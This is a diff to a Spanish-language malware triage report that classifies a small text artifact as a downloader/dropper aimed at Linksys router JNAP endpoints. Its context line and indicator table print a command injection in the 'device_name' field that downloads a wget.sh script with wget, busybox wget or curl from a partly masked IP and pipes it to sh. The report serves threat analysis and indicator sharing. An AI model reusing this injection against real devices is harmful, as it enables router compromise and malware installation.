@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 397 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `GetStationInfo` en `hxxp://linksys[.]com/jnap/wpsstationinfo/GetStationInfo`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:49:46+00:00`
+- **Registrado:** `2026-08-09T19:49:46.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,12 +53,12 @@ device_name=cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwp
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
+| url | hxxp://linksys[.]com/jnap/wpsstationinfo/GetStationInfo | strings |
+| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lwps | strings |
 | ip | 190.179.139.XXX | static_analysis |
 | ip | 91.92.40.XXX | static_analysis |
-| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20lwps | strings |
-| url | hxxp://linksys[.]com/jnap/wpsstationinfo/GetStationInfo | strings |
-| hash | 47fd87fe3db86058d85c55a394339bb5e3ba852d0083cbd568c2e05713693946 | static_analysis |
 | command | device_name=cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20lwps%3Bbusybox%20wget%20http://91.92.40.XXX | strings |
+| hash | 47fd87fe3db86058d85c55a394339bb5e3ba852d0083cbd568c2e05713693946 | static_analysis |
 | ip | 45.153.34.XXX | artifact_source |
 
 ## 🔎 Triage
